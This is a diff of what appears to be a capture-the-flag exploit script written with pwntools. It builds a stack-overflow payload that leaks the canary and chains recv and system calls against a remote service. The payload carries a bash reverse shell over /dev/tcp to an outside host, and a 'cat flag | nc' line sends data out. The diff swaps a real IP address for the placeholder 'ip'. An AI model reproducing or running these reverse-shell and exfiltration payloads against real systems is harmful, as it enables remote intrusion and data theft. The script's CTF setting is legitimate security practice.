@@ -180,12 +180,12 @@ writable_addr = base_addr + 0x307C
 
 p = remote(IP, PORT)
 pause()
-payload2 = 'bash -i >& /dev/tcp/207.148.66.85/8888 0>&1'.ljust(64, '\x00') + canary + ebp1 + base + ebp2 + p32(base_addr + recv_plt) + p32(system_addr) + p32(4) + p32(writable_addr) + p32(100) + p32(0)
+payload2 = 'bash -i >& /dev/tcp/ip/8888 0>&1'.ljust(64, '\x00') + canary + ebp1 + base + ebp2 + p32(base_addr + recv_plt) + p32(system_addr) + p32(4) + p32(writable_addr) + p32(100) + p32(0)
 
 #payload2 = 'bash -i >& /dev/tcp/192.168.23.130/8888 0>&1'.ljust(64, '\x00') + canary + 'a' * 12 + p32(recv_plt) + p32(0x08048fb8) + p32(4) + p32(writable_addr) + p32(100) + p32(0) + p32(system_addr) + p32(0) + p32(writable_addr)
 
 p.sendlineafter('Would you like some delicious pie?', payload2)
-p.send('cat flag | nc 207.148.66.85 8888'.ljust(100, '\x00'))
+p.send('cat flag | nc ip 8888'.ljust(100, '\x00'))
 
 
 payload3 = 'a' * 64 + canary + ebp1 + base + ebp2 + p32(system_addr) + p32(0) + p32(writable_addr)
